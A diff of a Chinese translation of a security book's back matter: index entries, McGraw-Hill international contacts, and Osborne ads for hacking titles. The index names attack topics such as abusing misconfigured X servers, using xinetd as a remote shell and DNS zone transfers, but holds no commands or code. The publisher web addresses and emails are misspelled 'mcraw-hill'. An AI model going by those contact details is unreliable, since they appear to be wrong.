-- Zbedee 命令行工具，执行端口重定向，配合使用，107–109
-- ZEthereal，配合 Zaurus PDAs 使用，184
-- Znesus，配合 Zaurus PDAs 使用，184–185
-
-# X
-
-+ x (执行) 权限，示例，144
-- X 服务器
-  -   滥用配置错误，100–102
-  -   阻塞与隧道，102
-  -   带有 TCP 端口 6000-6063 的 X 窗口系统漏洞，100–102
-- xinetd
-  -   以及 inet 加固，134–135
-  -   作为远程 shell 使用，122–123
-- xkey 工具，下载，102
-- XMAS 扫描，使用 Nmap 执行，28
-- XOR 真值表，配合掩码值使用，146–147
-- Xprobe，操作系统指纹识别，32–34
-
-+ 区域传输
-  -   使用 host 命令执行，16–18
-  -   防止滥用，18
-  -   使用，16–18
+- `wheel` 组，限制许多用户对 `setuid` 程序的访问，150
 
 # 国际联系信息
 
 澳大利亚
-McGraw-Hill Book Company Australia Pty. Ltd.
+`McGraw-Hill Book Company Australia Pty. Ltd.`
 电话 +61-2-9800-1800
-传 +61-2-9878-8881
-http://www.mcraw-hill.com
-books-it-sydney@mcraw-hill.com
-
-南非
-McGraw-Hill South Africa
-电话 +27-11-622-7512
-传 +27-11-622-9045
-robyn_swaneopel@mcraw-hill.com
-
-加拿大
-McGraw-Hill Ryerson Ltd.
-电话 +905-430-5020
-传 +905-430-5020
-http://www.mcraw-hill.ca
-
-西班牙
-McGraw-Hill/Interamericana de España, S.A.U.
-电话 +34-91-180-3000
-传 +34-91-372-8513
-http://www.mcraw-hill.es
-professional_europe@mcraw-hill.com
-
-希腊、中东及非洲
-（不包括南非）
-McGraw-Hill Hellas
-电话 +30-21-6560-990
-电话 +30-21-6560-993
-电话 +30-21-6545-525
-
-英国、北欧及中欧
-McGraw-Hill Education Europe
-电话 +44-1-628-502500
-传 +44-1-628-702224
-http://www.mcraw-hill.co.uk
-computing_europe@mcraw-hill.com
-
-墨西哥（也涵盖拉丁美洲）
-McGraw-Hill Interamericana Editores S.A. de V.
-电话 +525-117-1583
-传 +525-117-1589
-http://www.mcraw-hill.mx
-fernando_castanos@mcraw-hill.com
-
-其他查询：
-McGraw-Hill/Osborne
-电话 +1-510-420-7700
-传 +1-510-420-7703
-http://www.osborne.com
-ong_international@mcraw-hill.com
-
-新加坡（服务亚洲）
-McGraw-Hill Book Company
-电话 +65-6863-1580
-传 +65-6862-3354
-http://www.mcraw-hill.sg
-mghasia@mcraw-hill.com
 
 # 前线安全
-
-这些实用的便携资源包含了关于关键问题的简明信息，非常适合 IT 专业人士。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_254_0)
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_254_1)
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_254_2)
 
-HackNotes™Linux/Unix 安全便携参考
+`HackNotes™Linux/Unix` 安全便携参考
 作者：Nitesh Dhanjani
 ISBN: 0-07-222786-9
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_3)
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_4)
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_5)
-
-HackNotes™网络安全便携参考
-作者：Mike Horton & Clinton Mugge
-ISBN: 0-07-222783-4
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_6)
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_7)
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_8)
-
-HackNotes™Web 安全便携参考
-作者：Mike O'Shea
-ISBN: 0-07-222784-0
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_9)
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_10)
-
-HackNotes™Windows 安全便携参考
-作者：Michael O'Shea
-ISBN: 0-07-222795-0
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_254_11)
-
-OSBORNE 交付成果！
-OSBORNE www.osborne.com
 
 # 查看 Osborne 的所有黑客书籍
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_255_0)
 
-Hacking Exposed JEE & Java
+`Hacking Exposed JEE & Java`
 作者：A. TAYLOR, B. BUEGE, R. LAYMAN
 0-07-222565-3
 价格 $49.99
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_255_1)
-
-Hacking Exposed Web Applications
-作者：J. SCAMB, M. SHEMA
-0-07-222438-X
-价格 $49.99
-
-- 解释如何对使用以下内容的应用实施安全措施：Servlets 和 Java 页面 (JSPs)
-- 企业 Java Bean (EJBs) ** Web 服务 ** Applets
-- Java Web Start ** 远程方法调用 (RMI) ** Java 消息服务 (JMS)
-- 展示攻击者如何识别 Web 应用组件中的潜在漏洞
-- 学习存在 Apache、IIS、Netscape Enterprise Server、JEE、ASP.NET 等 Web 服务器平台内的破坏性漏洞
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_255_2)
-
-Hacking Windows 2000
-作者：S. MCCLIRE, J. SCAMGRAY
-0-07-219926-3
-价格 $49.99
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_255_3)
-
-Hacking Linux Exposed, 第二版
-作者：B. HATCH, J. LEE
-0-07-223564-5
-价格 $49.99
-
-- 展示如何在进行攻击的同时，也提供如何修复 Windows 2000 网络安全漏洞的具体解决方案
-- 详细介绍 Linux 特有的攻击（包括内部和外部）以及如何阻止它们
-
-![](img/17cb132e62949dc7f5e0eadf90c71f51_255_4)
-
